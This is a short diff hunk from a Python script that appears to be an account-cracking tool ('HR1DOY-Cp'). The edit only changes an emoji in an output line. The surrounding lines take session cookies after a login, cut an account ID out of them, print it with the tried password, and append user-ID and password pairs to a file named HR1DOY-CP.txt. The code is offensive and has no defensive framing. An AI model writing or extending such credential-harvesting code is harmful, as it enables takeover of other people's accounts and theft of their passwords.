@@ -423,7 +423,7 @@ def c(uid,pwx,ln):
             	#botcp(uid,ps)
             	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
             	cid = coki[82:97]
-            	print('\33[1;30m(HR1DOY-Cp [⚡️] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
+            	print('\33[1;30m(HR1DOY-Cp [!] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
             	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
             	open('HR1DOY-CP.txt', 'a').write( uid+' | '+ps+' \n')
             	cps.append(cid)
